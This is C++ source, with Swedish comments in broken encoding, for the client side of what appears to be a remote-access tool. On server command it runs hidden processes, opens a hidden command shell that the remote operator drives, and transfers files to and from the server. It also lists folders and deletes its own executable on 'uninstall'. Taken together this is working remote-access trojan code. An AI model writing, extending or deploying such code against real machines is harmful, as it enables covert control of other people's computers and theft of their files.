#pragma once
#include "precompile.h"
#include "client.h"
#include "shell_process.h"
#include "payloads.h"

response_table client::get_responses()
{
	return {
		{"process-v", payload::process_execution_show}, // f�r att starta en process
		{"process-h", payload::process_execution_hidden}, // f�r att starta en g�md process
		{"download", payload::download_file}, // f�r att �ver f�ra en fil till servern
		{"shell-read", [&](std::string data) { return std::string(shell.alive() ? (shell.ready() ? "ready" : "alive"): "dead") + "|" + shell.read_once();}}, // l�sa fr�n shellen som man skapare via shell-init
		{"shell-write", [&](std::string data) { return std::string(shell.alive() ? "alive" : "dead") + "|" + (shell.write(data) ? "OK" : "FAIL"); }}, // skriv till shellen efter l�sning
		{"folder-index", [&](std::string data) {
			directory folder(data); // indexera mappen fr�n servern
			std::string serilized;
			for (auto [path, size] : folder.current_directory()) { // serializa indexering till en str�ng
				serilized += path.string() + "*" + std::to_string(size) + "|"; // to string f�r att ignorera locale vid utskrivning av nummer tex med locale blir 1000 -> 1,000
			}
			return serilized.substr(0, serilized.length() - 1); // ta bort sista |
		}}
	};
}

action_table client::get_actions()
{
	return {
		{"exit", [&](std::string data) { exit(0); }}, // f�r att st�nga ner klienten

		{"uninstall", [&](std::string) { // f�r att avinstallera klienten
			payload::process_execution(R"("C:\Windows\System32\cmd.exe" /K timeout /t 2 && del )" + std::filesystem::current_path().string() + "\\client.exe", true); exit(0);
		}},

		{"upload", [&](std::string data) {
			auto [file, folder] = helper::ArgSplit(data, '|');
			std::ofstream output(folder + "\\" + std::filesystem::path(file).filename().string(), std::ios::binary); // �ppna en filen som ska motas

			if (output.good()) { // om det g�r att �ppna filen p� den platsen
				client_implementation.send({ "upload_status", "Ok" });
			}
			else { // annars g�r det inte att �ppna pga kanske fel �gare av mappen eller skrivr�ttigheter
				client_implementation.send({ "upload_status", ":<" });
				return;
			}

			packet file_data = client_implementation.receive_packet(); // ta emot filen

			output << file_data.data; // skriv filen

			output.close(); // st�ng filen
			
		}},

		{"shell-init", [&](std::string data){
			auto [process, cwd] = helper::ArgSplit(data, '|');

			properties prop{
				process,
				cwd,
				CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP,
				STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW,
				SW_HIDE,
				true
			};
			
			shell = shell_process(prop);

			if (shell.open()) {
				client_implementation.send({"shell-status", "OK"});
				std::cout << "shell-process(" << data << ") -> " << Error(0) << std::endl;
			}
			else {
				auto error = std::error_code(GetLastError(), std::system_category());
				std::cout << data << " -> " << error << std::endl;;
				client_implementation.send({"shell-status", std::to_string(error.value()) + " -> " + error.message()});
				return;
			}
		}},
	};
}